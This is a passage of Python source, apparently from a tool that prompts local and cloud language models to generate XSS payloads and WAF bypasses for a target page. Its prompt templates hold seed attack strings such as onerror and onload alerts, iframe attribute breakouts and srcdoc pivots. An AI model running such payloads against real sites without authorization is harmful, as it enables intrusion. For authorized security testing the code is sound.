                                "items": {"type": "string"},
                            },
                            "target_sink": {"type": "string"},
                            "bypass_family": {"type": "string"},
                            "risk_score": {"type": "integer"},
                        },
                        "required": [
                            "payload",
                            "title",
                            "explanation",
                            "test_vector",
                            "tags",
                            "target_sink",
                            "bypass_family",
                            "risk_score",
                        ],
                        "additionalProperties": False,
                    },
                },
            },
            "required": ["payloads"],
            "additionalProperties": False,
        }
    return None


def _prompt_for_generation_phase(
    context: ParsedContext,
    phase: str,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
) -> str:
    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
    if phase == "research":
        return _cloud_prompt_for_context(
            context,
            reference_payloads=reference_payloads,
            waf=waf,
            past_findings=past_findings,
            past_lessons=past_lessons,
            strategy_hint=strategy_hint,
        )
    dom_runtime = _extract_dom_runtime_context(context)
    if dom_runtime:
        return _compact_dom_prompt_for_cloud(
            context,
            waf=waf,
            past_findings=past_findings,
            past_lessons=past_lessons,
            strategy_hint=strategy_hint,
            reference_payloads=reference_payloads,
        )

    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    scout_context_envelope_section = _context_envelope_section(context, waf=waf, compact=True)
    context_envelope_section = _context_envelope_section(context, waf=waf)
    planning_envelope_section = _planning_envelope_section(
        context,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    success_envelope_section = _success_envelope_section(past_lessons)
    failure_envelope_section = _failure_envelope_section(past_lessons)
    auth_section = ""
    if context.auth_notes:
        auth_section = (
            "SESSION CONTEXT:\n"
            + "\n".join(f"  - {note}" for note in context.auth_notes[:3])
            + "\n"
        )
    probe_lines = [
        f"Primary sink type: {sink_type or 'unknown'}",
        f"Reflection context: {context_type or 'unknown'}",
        f"Confirmed surviving special characters: {surviving_chars or '(none observed)'}",
    ]
    # href bypass: injection is in HTML body — must inject a full tag, not a bare URI
    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
        probe_lines.append(
            "INJECTION SHAPE: Parameter is in HTML BODY — inject a FULL TAG like "
            '<a href="javascript:alert(1)">x</a> or '
            '<button formaction="javascript:alert(1)">x</button>. '
            "Event handlers (onerror/ontoggle/onload) are stripped. "
            "Bare javascript: URIs render as plain text — always wrap in a tag."
        )
    seed_section = _seed_examples_section(
        context_type=context_type,
        surviving_chars=surviving_chars,
        reference_payloads=reference_payloads,
        waf=waf,
    )
    if phase == "scout":
        obfuscation_section = _obfuscation_techniques_section(context_type)
        return (
            "You are an authorized XSS assessor. Generate payloads only — no analysis.\n"
            "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
            + "\n".join(probe_lines)
            + "\n"
            + obfuscation_section
            + "Task: produce 5-8 payloads that apply the techniques above to this exact context.\n"
            "Use seeds as few-shot grounding — mutate and combine techniques, do not copy seeds verbatim.\n"
            "Each payload must include: payload, title, test_vector, bypass_family.\n"
            + scout_context_envelope_section
            + seed_section
        ).strip()

    findings_section = _similar_findings_section(
        past_findings,
        context_type=context_type,
        limit=3,
    )
    app_signals_section = _application_signals_section(
        context_type=context_type,
        surviving_chars=surviving_chars,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
        context=context,
    )
    return (
        "You are an authorized XSS assessor. The fast scan did not confirm execution.\n"
        "Reason about what this specific application blocks and allows. Generate payloads only — no analysis.\n"
        "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
        + app_signals_section
        + success_envelope_section
        + failure_envelope_section
        + findings_section
        + seed_section
        + auth_section
        + "Task: produce 6-8 payloads that work around what this application blocks.\n"
        "Use the application signals above to reason about what survives sanitization.\n"
        "Prefer materially distinct techniques. Target this application specifically.\n"
        "Each payload must include: payload, title, explanation, test_vector, tags, target_sink, bypass_family, risk_score.\n"
    ).strip()


def _compact_reflected_research_prompt(
    context: ParsedContext,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
) -> str:
    sink_type, context_type, surviving_chars = _extract_probe_context(context)
    context_envelope_section = _context_envelope_section(context, waf=waf)
    planning_envelope_section = _planning_envelope_section(
        context,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    success_envelope_section = _success_envelope_section(past_lessons)
    failure_envelope_section = _failure_envelope_section(past_lessons)
    findings_section = _similar_findings_section(
        past_findings,
        context_type=context_type,
        limit=5,
    )
    seed_section = _seed_examples_section(
        context_type=context_type,
        surviving_chars=surviving_chars,
        reference_payloads=reference_payloads,
        waf=waf,
    )
    auth_section = ""
    if context.auth_notes:
        auth_section = (
            "SESSION CONTEXT:\n"
            + "\n".join(f"  - {note}" for note in context.auth_notes[:3])
            + "\n"
        )

    probe_lines = [
        f"Target URL: {context.source}",
        f"Primary sink type: {sink_type or 'unknown'}",
        f"Reflection context: {context_type or 'unknown'}",
        f"Confirmed surviving special characters: {surviving_chars or '(none observed)'}",
    ]

    return (
        "You are generating payloads for an authorized XSS assessment.\n"
        "Return ONLY a JSON object.\n\n"
        "Output schema:\n"
        "{\n"
        "  \"payloads\": [\n"
        "    {\n"
        "      \"payload\": \"string\",\n"
        "      \"title\": \"short name\",\n"
        "      \"explanation\": \"why it fits this exact context\",\n"
        "      \"test_vector\": \"exact delivery string\",\n"
        "      \"tags\": [\"tag1\", \"tag2\"],\n"
        "      \"target_sink\": \"sink name or empty\",\n"
        f"{_STRATEGY_SCHEMA_BLOCK}\n"
        "      \"bypass_family\": \"best-fit family\",\n"
        "      \"risk_score\": 1-100\n"
        "    }\n"
        "  ]\n"
        "}\n\n"
        + "\n".join(probe_lines)
        + "\n"
        "Only special-character survival is measured; do not assume letters or digits are blocked.\n"
        "Task: produce 8-12 payloads for this exact context.\n"
        "Few-shot examples matter more than restating constraints: mutate successful and similar payloads instead of copying them.\n"
        "If needed, use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding only when they materially help this context.\n"
        "Prefer materially distinct techniques and keep the output execution-focused.\n"
        + context_envelope_section
        + planning_envelope_section
        + seed_section
        + success_envelope_section
        + failure_envelope_section
        + findings_section
        + auth_section
    ).strip()


def _dom_sink_request_profile(sink: str) -> tuple[str, list[str]]:
    normalized = sink.strip().lower()
    if normalized in {"innerhtml", "outerhtml", "insertadjacenthtml"}:
        return (
            "html_injection",
            [
                "Focus on direct HTML element injection that auto-executes without user interaction.",
                "Prefer compact event-handler payloads such as image, svg, details, or similar DOM-native HTML vectors.",
                "Do not spend tokens on JavaScript string breakout ideas unless the sink explicitly indicates script evaluation.",
            ],
        )
    if normalized in {"eval", "function", "settimeout", "setinterval"}:
        return (
            "js_execution",
            [
                "Focus on JavaScript expressions or statements that execute immediately in code-evaluation sinks.",
                "Prefer short expression payloads over HTML tags.",
                "Do not propose HTML-only payloads unless they are wrapped in code that the sink will execute.",
            ],
        )
    if normalized in {"document.write", "document.writeln"}:
        return (
            "document_write",
            [
                "Focus on HTML or attribute breakout payloads suitable for markup assembled by document.write.",
                "Prioritize quote closure, URL-attribute breakout, and same-tag event-handler injection when angle brackets may be constrained.",
                "Include both full-tag injection payloads and no-angle-bracket attribute pivots if they are plausible.",
            ],
        )
    return (
        "generic_dom",
        [
            "Focus on payloads tailored to the exact DOM sink that already received tainted input.",
            "Prefer compact, auto-executing payloads over generic broad XSS lists.",
        ],
    )


def _compact_dom_prompt_for_local(
    context: ParsedContext,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
    reference_payloads: list[Any] | None = None,
) -> str:
    """Build a compact sink-specific DOM prompt for smaller local models."""
    dom_runtime = _extract_dom_runtime_context(context)
    sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
    profile_name, profile_rules = _dom_sink_request_profile(sink)
    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)

    findings_section = ""
    if past_findings:
        slim = [
            {
                "payload": finding.payload,
                "sink_type": finding.sink_type,
                "context_type": finding.context_type,
                "bypass_family": finding.bypass_family,
            }
            for finding in past_findings[:2]
        ]
        findings_section = "Related findings:\n" + json.dumps(slim, indent=2) + "\n"

    lessons_section = ""
    if past_lessons:
        lesson_lines = []
        for lesson in past_lessons[:2]:
            title = getattr(lesson, "title", "")
            summary = getattr(lesson, "summary", "")
            if title or summary:
                lesson_lines.append(f"- {title}: {summary}".strip(": "))
        if lesson_lines:
            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
    context_envelope_section = _context_envelope_section(context, waf=waf)
    planning_envelope_section = _planning_envelope_section(
        context,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    success_envelope_section = _success_envelope_section(past_lessons)
    failure_envelope_section = _failure_envelope_section(past_lessons)
    seed_section = _seed_examples_section(
        context_type="dom_xss",
        surviving_chars="",
        reference_payloads=reference_payloads,
        waf=waf,
    )

    context_summary = {
        "source": context.source,
        "frameworks": context.frameworks[:3],
        "auth": bool(context.auth_notes),
        "dom_runtime": dom_runtime,
        "dom_sinks": [
            {
                "sink": sink_item.sink,
                "location": sink_item.location,
            }
            for sink_item in context.dom_sinks[:3]
        ],
    }

    waf_line = f"WAF: {waf}\n" if waf else ""
    rule_lines = "\n".join(f"- {rule}" for rule in profile_rules)

    return f"""You are generating authorized DOM XSS test payloads for a small local model pass.
Return ONLY compact JSON.

Output schema:
{{
  "payloads": [
    {{
      "payload": "string",
      "target_sink": "{sink or 'unknown'}",
      "tags": ["short", "labels"],
      "strategy": {{
        "attack_family": "short family label",
        "delivery_mode_hint": "query | fragment | post | same_page",
        "encoding_hint": "raw | html_entity | url_encoded | mixed",
        "session_hint": "same_page | navigate_then_fire | post_then_sink",
        "follow_up_hint": "next tactic if this class misses",
        "coordination_hint": "single_param | multi_param | fragment_only | same_tag_pivot"
      }}
    }}
  ]
}}

Requirements:
- Produce 3-6 payloads only.
- Solve the exact DOM source->sink path shown below.
- Prefer fast, practical payloads over exhaustive coverage.
- Avoid explanations, rankings, essays, or long reasoning.
- Keep each `strategy` object short and actionable.
- If the effective constraints suggest it, you may use uncommon encodings such as numeric entities or Unicode-width variants, but only when they plausibly survive and change interpretation.
- Sink profile: {profile_name}
{rule_lines}

DOM runtime:
{json.dumps(dom_runtime, indent=2)}
{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{lessons_section}{findings_section}{seed_section}Context summary:
{json.dumps(context_summary, indent=2)}""".strip()


def _dom_seed_examples(profile_name: str) -> list[dict[str, Any]]:
    if profile_name == "html_injection":
        return [
            {
                "payload": "<img src=x onerror=alert(1)>",
                "title": "img onerror",
                "test_vector": "?param=<img src=x onerror=alert(1)>",
                "tags": ["html", "event-handler", "autofire"],
                "target_sink": "innerHTML",
                "bypass_family": "event-handler-injection",
                "risk_score": 88,
            },
            {
                "payload": "<svg onload=alert(1)>",
                "title": "svg onload",
                "test_vector": "?param=<svg onload=alert(1)>",
                "tags": ["svg", "autofire"],
                "target_sink": "innerHTML",
                "bypass_family": "svg-namespace",
                "risk_score": 84,
            },
        ]
    if profile_name == "js_execution":
        return [
            {
                "payload": "alert(1)",
                "title": "direct alert",
                "test_vector": "#alert(1)",
                "tags": ["javascript", "expression"],
                "target_sink": "eval",
                "bypass_family": "js-string-breakout",
                "risk_score": 82,
            },
            {
                "payload": "confirm(1)",
                "title": "direct confirm",
                "test_vector": "#confirm(1)",
                "tags": ["javascript", "expression"],
                "target_sink": "eval",
                "bypass_family": "js-string-breakout",
                "risk_score": 78,
            },
        ]
    return []


def _document_write_subcontext(context: ParsedContext) -> dict[str, Any]:
    """Infer a narrower HTML subcontext for document.write sinks when possible."""
    dom_runtime = _extract_dom_runtime_context(context)
    source_type = dom_runtime.get("source_type", "")
    source_name = dom_runtime.get("source_name", "")

    for script in context.inline_scripts:
        compact = " ".join(script.split())
        lower = compact.lower()
        if "document.write" not in lower:
            continue

        hint: dict[str, Any] = {
            "script_excerpt": compact[:240],
            "source_type": source_type,
            "source_name": source_name,
        }

        if "<iframe" in lower and "src='" in lower:
            hint.update(
                {
                    "html_subcontext": "single_quoted_html_attr",
                    "tag": "iframe",
                    "attribute": "src",
                    "quote_style": "single",
                    "payload_shape": "same_tag_attribute_breakout",
                    "attacker_prefix": "<iframe src='",
                }
            )
            if "' width='" in compact:
                suffix = compact.split("' width='", 1)[1]
                hint["attacker_suffix"] = "' width='" + suffix[:80]
            hint["recommended_families"] = [
                "same-tag event handler injection",
                "srcdoc pivot",
                "quote closure without angle brackets",
                "full tag escape only if angle brackets are likely to survive",
            ]
            if source_type == "fragment":
                hint["source_behavior"] = (
                    "Fragment payloads often arrive URL-encoded inside the iframe src string. "
                    "Prefer quote closure and same-tag attribute injection before relying on raw < >."
                )
            elif source_type == "query_param":
                hint["source_behavior"] = (
                    "The full query string is concatenated into the iframe src URL. "
                    "Prefer breaking out of the single-quoted src attribute before attempting full-tag injection."
                )
            return hint

    return {
        "html_subcontext": "unknown_document_write_markup",
        "source_type": source_type,
        "source_name": source_name,
        "recommended_families": [
            "same-tag attribute injection",
            "quote closure",
            "srcdoc pivot",
            "full tag escape",
        ],
    }


def _compact_dom_prompt_for_cloud(
    context: ParsedContext,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
    reference_payloads: list[Any] | None = None,
) -> str:
    """Build a compact seeded DOM cloud prompt for simpler sink families."""
    dom_runtime = _extract_dom_runtime_context(context)
    sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
    profile_name, profile_rules = _dom_sink_request_profile(sink)
    merged_reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
    seed_examples = _reference_payload_examples(merged_reference_payloads, limit=5)
    if not seed_examples:
        seed_examples = _dom_seed_examples(profile_name)
    behavior_section = _behavior_profile_section(context)
    findings_section = _similar_findings_section(
        past_findings,
        context_type="dom_xss",
        limit=5,
    )

    lessons_section = ""
    if past_lessons:
        lesson_lines = []
        for lesson in past_lessons[:3]:
            title = getattr(lesson, "title", "")
            summary = getattr(lesson, "summary", "")
            if title or summary:
                lesson_lines.append(f"- {title}: {summary}".strip(": "))
        if lesson_lines:
            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
    context_envelope_section = _context_envelope_section(context, waf=waf)
    planning_envelope_section = _planning_envelope_section(
        context,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    success_envelope_section = _success_envelope_section(past_lessons)
    failure_envelope_section = _failure_envelope_section(past_lessons)

    context_summary = {
        "source": context.source,
        "frameworks": context.frameworks[:3],
        "auth": bool(context.auth_notes),
        "dom_runtime": dom_runtime,
        "dom_sinks": [
            {
                "sink": sink_item.sink,
                "location": sink_item.location,
            }
            for sink_item in context.dom_sinks[:3]
        ],
    }

    waf_line = f"WAF: {waf}\n" if waf else ""
    rule_lines = "\n".join(f"- {rule}" for rule in profile_rules)
    seed_section = ""
    if seed_examples:
        seed_section = "Seed technique examples:\n" + json.dumps(seed_examples, indent=2) + "\n"

    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
Return ONLY a JSON object.

Output schema:
{{
  "payloads": [
    {{
      "payload": "string",
      "title": "short name",
      "explanation": "why it fits this exact DOM context",
      "test_vector": "exact delivery string",
      "tags": ["tag1", "tag2"],
      "target_sink": "{sink or 'unknown'}",
{_STRATEGY_SCHEMA_BLOCK}
      "bypass_family": "best-fit family",
      "risk_score": 1-100
    }}
  ]
}}

Requirements:
- Produce 4-8 payloads only.
- Solve the exact DOM source->sink path shown below.
- Do not return an empty payload list.
- Prefer materially distinct payload families over near-duplicates.
- Keep payloads compact and execution-focused.
- Use `strategy` to describe delivery shape and the next tactic to pivot to if the sink stays taint-only.
- If the effective constraints justify it, you may use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding, but only when they plausibly change parser or WAF interpretation.
- Sink profile: {profile_name}
{rule_lines}

DOM runtime:
{json.dumps(dom_runtime, indent=2)}
{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{behavior_section}{lessons_section}{findings_section}{seed_section}Context summary:
{json.dumps(context_summary, indent=2)}""".strip()


def _document_write_prompt_for_cloud(
    context: ParsedContext,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
    reference_payloads: list[Any] | None = None,
) -> str:
    """Build a focused rich prompt for document.write DOM sinks."""
    dom_runtime = _extract_dom_runtime_context(context)
    subcontext = _document_write_subcontext(context)
    behavior_section = _behavior_profile_section(context)

    lessons_section = ""
    if past_lessons:
        lesson_lines = []
        for lesson in past_lessons[:4]:
            title = getattr(lesson, "title", "")
            summary = getattr(lesson, "summary", "")
            if title or summary:
                lesson_lines.append(f"- {title}: {summary}".strip(": "))
        if lesson_lines:
            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
    context_envelope_section = _context_envelope_section(context, waf=waf)
    planning_envelope_section = _planning_envelope_section(
        context,
        waf=waf,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )
    success_envelope_section = _success_envelope_section(past_lessons)
    failure_envelope_section = _failure_envelope_section(past_lessons)
    findings_section = _similar_findings_section(
        past_findings,
        context_type="dom_xss",
        limit=5,
    )
    seed_examples = _reference_payload_examples(
        _merged_reference_payloads(reference_payloads, past_lessons),
        limit=5,
    )
    seed_section = ""
    if seed_examples:
        seed_section = "Seed technique examples:\n" + json.dumps(seed_examples, indent=2) + "\n"

    targeted_examples = [
        {
            "payload": "'onload='alert(1)",
            "title": "same-tag onload pivot",
            "why": "Closes a single-quoted iframe src attribute and injects an event handler without needing angle brackets.",
        },
        {
            "payload": "'srcdoc='&#x3C;svg/onload=alert(1)&#x3E;'>",
            "title": "srcdoc pivot",
            "why": "Breaks out of the iframe src attribute and swaps execution into srcdoc using encoded markup.",
        },
        {
            "payload": "'><svg onload=alert(1)>",
            "title": "full tag escape",
            "why": "Useful only if angle brackets survive to the document.write sink.",
        },
    ]

    context_summary = {
        "source": context.source,
        "frameworks": context.frameworks[:3],
        "auth": bool(context.auth_notes),
        "dom_runtime": dom_runtime,
        "document_write_subcontext": subcontext,
        "inline_scripts": context.inline_scripts[:2],
    }

    waf_line = f"WAF: {waf}\n" if waf else ""
    recommended = "\n".join(
        f"- {item}" for item in subcontext.get("recommended_families", [])
    )

    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
Return ONLY a JSON object.

Output schema:
{{
  "payloads": [
    {{
      "payload": "string",
      "title": "short name",
      "explanation": "why it fits this exact document.write subcontext",
      "test_vector": "exact delivery string",
      "tags": ["tag1", "tag2"],
      "target_sink": "document.write",
{_STRATEGY_SCHEMA_BLOCK}
      "bypass_family": "best-fit family",
      "risk_score": 1-100
    }}
  ]
}}

Requirements:
- Produce 6-10 payloads only.
- Do not return an empty payload list.
- Solve the exact source->sink path below, not generic XSS.
- Bias toward payloads that execute inside the existing tag first.
- Include at least:
  - 3 same-tag attribute pivots that do not require raw < >
  - 2 srcdoc or URL-attribute pivots if plausible
  - 1 full tag breakout only if angle brackets might survive
- Avoid safe parser probes and other non-executing markup.
- Prefer materially distinct payload families over near-duplicates.
- Use `strategy` to explain which attack family the payload belongs to and what family should be tried next if it does not execute.
- If the effective constraints justify it, you may use uncommon encodings such as numeric entities, Unicode-width variants, or mixed encoding, but only when they plausibly improve this exact document.write subcontext.

DOM runtime:
{json.dumps(dom_runtime, indent=2)}
Document.write subcontext:
{json.dumps(subcontext, indent=2)}
Recommended payload families:
{recommended}
{waf_line}{context_envelope_section}{planning_envelope_section}{success_envelope_section}{failure_envelope_section}{behavior_section}{lessons_section}{findings_section}{seed_section}Targeted examples:
{json.dumps(targeted_examples, indent=2)}
Context summary:
{json.dumps(context_summary, indent=2)}""".strip()


def _cloud_prompt_for_context(
    context: ParsedContext,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    strategy_hint: str | None = None,
) -> str:
    """Choose a cloud prompt shape based on the DOM sink profile."""
    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
    dom_runtime = _extract_dom_runtime_context(context)
    if dom_runtime:
        sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
        profile_name, _ = _dom_sink_request_profile(sink)
        if profile_name == "document_write":
            return _document_write_prompt_for_cloud(
                context,
                waf=waf,
                past_findings=past_findings,
                past_lessons=past_lessons,
                strategy_hint=strategy_hint,
                reference_payloads=reference_payloads,
            )
        if profile_name != "document_write":
            return _compact_dom_prompt_for_cloud(
                context,
                waf=waf,
                past_findings=past_findings,
                past_lessons=past_lessons,
                strategy_hint=strategy_hint,
                reference_payloads=reference_payloads,
            )
    return _compact_reflected_research_prompt(
        context,
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        strategy_hint=strategy_hint,
    )


# ---------------------------------------------------------------------------
# Output quality gate
# ---------------------------------------------------------------------------

def _is_weak_output(payloads: list[PayloadCandidate]) -> bool:
    """Return True when the LLM output is too generic to be useful.

    Triggers escalation to a stronger model.
    """
    if len(payloads) < 3:
        return True
    # If every payload is a verbatim copy of a well-known base payload it means
    # the model just parroted the examples without reasoning about the context.
    _GENERIC = {
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(document.domain)>",
        "javascript:alert(document.cookie)",
        "<script>alert(1)</script>",
        "';alert(1)//",
        '";alert(1)//',
    }
    novel = [p for p in payloads if p.payload not in _GENERIC]
    return len(novel) < 2


# ---------------------------------------------------------------------------
# Ollama backend
# ---------------------------------------------------------------------------

def _parse_ollama_table(text: str) -> list[dict[str, str]]:
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    if not lines:
        return []
    headers = re.split(r"\s{2,}", lines[0])
    rows: list[dict[str, str]] = []
    for line in lines[1:]:
        columns = re.split(r"\s{2,}", line, maxsplit=max(0, len(headers) - 1))
        if len(columns) < len(headers):
            columns.extend([""] * (len(headers) - len(columns)))
        rows.append({header: value for header, value in zip(headers, columns)})
    return rows


def _run_ollama_command(*args: str) -> subprocess.CompletedProcess[str]:
    if shutil.which("ollama") is None:
        raise RuntimeError("ollama binary not found")
    result = subprocess.run(
        ["ollama", *args],
        check=False,
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise RuntimeError((result.stderr or result.stdout or f"ollama {' '.join(args)} failed").strip())
    return result


def list_ollama_models() -> tuple[list[dict[str, str]], str]:
    result = _run_ollama_command("list")
    return _parse_ollama_table(result.stdout), "ollama list"


def _search_ollama_library(query: str) -> list[dict[str, str]]:
    response = requests.get(
        f"https://ollama.com/search?q={quote_plus(query)}",
        timeout=10,
        headers={"User-Agent": "axss/0.1 (+authorized security testing)"},
    )
    response.raise_for_status()
    matches = re.findall(r'href="/library/([^"?#]+)"', response.text)
    rows: list[dict[str, str]] = []
    seen: set[str] = set()
    for match in matches:
        name = match.strip("/")
        if not name or name in seen:
            continue
        seen.add(name)
        rows.append({"NAME": name, "SOURCE": "ollama.com"})
    return rows[:20]


def search_ollama_models(query: str) -> tuple[list[dict[str, str]], str]:
    if shutil.which("ollama") is not None:
        result = subprocess.run(
            ["ollama", "search", query],
            check=False,
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            return _parse_ollama_table(result.stdout), "ollama search"
        stderr = (result.stderr or result.stdout or "").lower()
        unsupported_markers = ("unknown command", "no such command", "usage:")
        if not any(marker in stderr for marker in unsupported_markers):
            raise RuntimeError((result.stderr or result.stdout or "ollama search failed").strip())
    rows = _search_ollama_library(query)
    return rows, "ollama.com search"


def _candidate_models(model: str) -> list[str]:
    candidates = [model, *MODEL_ALIASES.get(model, [])]
    deduped: list[str] = []
    for candidate in candidates:
        if candidate and candidate not in deduped:
            deduped.append(candidate)
    return deduped


def _ensure_ollama_model(model: str) -> tuple[bool, str, str]:
    candidates = _candidate_models(model)
    if shutil.which("ollama") is None:
        return False, model, "ollama binary not found"
    try:
        response = requests.get(f"{OLLAMA_BASE_URL}/api/tags", timeout=3)
        response.raise_for_status()
        models = response.json().get("models", [])
        available = {entry.get("name") for entry in models if entry.get("name")}
        for candidate in candidates:
            if candidate in available:
                return True, candidate, "model already available"
    except Exception:
        pass
    errors: list[str] = []
    for candidate in candidates:
        pull = subprocess.run(
            ["ollama", "pull", candidate],
            check=False,
            capture_output=True,
            text=True,
        )
        if pull.returncode == 0:
            return True, candidate, "model pulled"
        errors.append(f"{candidate}: {(pull.stderr or pull.stdout or 'ollama pull failed').strip()}")
    return False, model, "; ".join(errors)


# ---------------------------------------------------------------------------
# JSON extraction / normalization
# ---------------------------------------------------------------------------

def _extract_json_blob(text: str) -> dict[str, Any]:
    start = text.find("{")
    end = text.rfind("}")
    if start == -1 or end == -1 or end <= start:
        raise ValueError("Model response did not include JSON")
    blob = text[start: end + 1]
    try:
        return json.loads(blob)
    except json.JSONDecodeError:
        # Models sometimes emit \x hex escapes or other non-standard escapes
        # inside JSON strings (e.g. \x3c instead of \u003c). Sanitize and retry.
        sanitized = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), blob)
        # Also escape any remaining lone backslashes that aren't valid JSON escapes
        sanitized = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', sanitized)
        return json.loads(sanitized)


def _normalize_strategy(item: dict[str, Any]) -> StrategyProfile | None:
    raw = item.get("strategy")
    if not isinstance(raw, dict):
        return None
    strategy = StrategyProfile(
        attack_family=str(raw.get("attack_family", "")).strip(),
        delivery_mode_hint=str(raw.get("delivery_mode_hint", "")).strip(),
        encoding_hint=str(raw.get("encoding_hint", "")).strip(),
        session_hint=str(raw.get("session_hint", "")).strip(),
        follow_up_hint=str(raw.get("follow_up_hint", "")).strip(),
        coordination_hint=str(raw.get("coordination_hint", "")).strip(),
    )
    if not any(strategy.to_dict().values()):
        return None
    return strategy


def _normalize_payloads(items: list[dict[str, Any]], source: str) -> list[PayloadCandidate]:
    normalized: list[PayloadCandidate] = []
    for item in items:
        payload = str(item.get("payload", "")).strip()
        if not payload:
            continue
        tags = [str(tag) for tag in item.get("tags", []) if str(tag).strip()]
        bypass_family = str(item.get("bypass_family", "")).strip() or infer_bypass_family(payload, tags)
        normalized.append(
            PayloadCandidate(
                payload=payload,
                title=str(item.get("title", "AI-generated payload")).strip() or "AI-generated payload",
                explanation=str(item.get("explanation", "Tailored by model output.")).strip(),
                test_vector=str(item.get("test_vector", "Inject into the highest-confidence sink.")).strip(),
                tags=tags,
                target_sink=str(item.get("target_sink", "")).strip(),
                framework_hint=str(item.get("framework_hint", "")).strip(),
                bypass_family=bypass_family,
                risk_score=int(item.get("risk_score", 0) or 0),
                source=source,
                strategy=_normalize_strategy(item),
            )
        )
    return normalized


# ---------------------------------------------------------------------------
# Ollama generation
# ---------------------------------------------------------------------------

def _generate_with_ollama(
    context: ParsedContext,
    model: str,
    reference_payloads: list[Any] | None = None,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    request_timeout_seconds: int = 120,
) -> tuple[list[PayloadCandidate], str]:
    ready, resolved_model, reason = _ensure_ollama_model(model)
    if not ready:
        raise RuntimeError(f"Ollama unavailable: {reason}")
    prompt = _prompt_for_generation_phase(
        context,
        phase="scout",
        reference_payloads=reference_payloads,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
    )
    response = requests.post(
        f"{OLLAMA_BASE_URL}/api/generate",
        json={"model": resolved_model, "prompt": prompt, "stream": False},
        timeout=max(1, request_timeout_seconds),
    )
    response.raise_for_status()
    body = response.json()
    data = _extract_json_blob(body.get("response", ""))
    return _normalize_payloads(data.get("payloads", []), source="ollama"), resolved_model


def _generate_dom_local_with_ollama(
    context: ParsedContext,
    model: str,
    waf: str | None = None,
    past_findings: list[Finding] | None = None,
    past_lessons: list[Any] | None = None,
    request_timeout_seconds: int = 60,
    reference_payloads: list[Any] | None = None,
) -> tuple[list[PayloadCandidate], str]:
    ready, resolved_model, reason = _ensure_ollama_model(model)
    if not ready:
        raise RuntimeError(f"Ollama unavailable: {reason}")
    prompt = _compact_dom_prompt_for_local(
        context,
        waf=waf,
        past_findings=past_findings,
        past_lessons=past_lessons,
        reference_payloads=reference_payloads,
    )
    response = requests.post(
        f"{OLLAMA_BASE_URL}/api/generate",
        json={"model": resolved_model, "prompt": prompt, "stream": False},
        timeout=max(1, request_timeout_seconds),
    )
    response.raise_for_status()
    body = response.json()
    data = _extract_json_blob(body.get("response", ""))
    return _normalize_payloads(data.get("payloads", []), source="ollama"), resolved_model


def triage_probe_result(
    *,
    context_type: str,
    surviving_chars: frozenset[str],
    waf: str | None,
    delivery_mode: str,
    model: str,
    request_timeout_seconds: int = 25,
) -> dict:
    """Ask the local Ollama model to triage a probe result.

    The local model's job is NOT to generate payloads — it's to classify
    whether this injection point is worth spending cloud API budget on.

    Returns a dict:
      score: int (1-10, 10 = highest XSS potential)
      should_escalate: bool
      reason: str  (brief justification)
      context_notes: str  (hints to pass to the cloud payload generator)
    """
    ready, resolved_model, reason_msg = _ensure_ollama_model(model)
    if not ready:
        # Unavailable → safe fallback: let cloud decide
        return {
            "score": 5,
            "should_escalate": True,
            "reason": f"Local model unavailable: {reason_msg}",
            "context_notes": "",
        }

    prompt_data = {
        "context_type": context_type,
        "surviving_chars": list(surviving_chars) if surviving_chars else [],
        "waf": waf or None,
        "delivery_mode": delivery_mode,
    }
    system = (
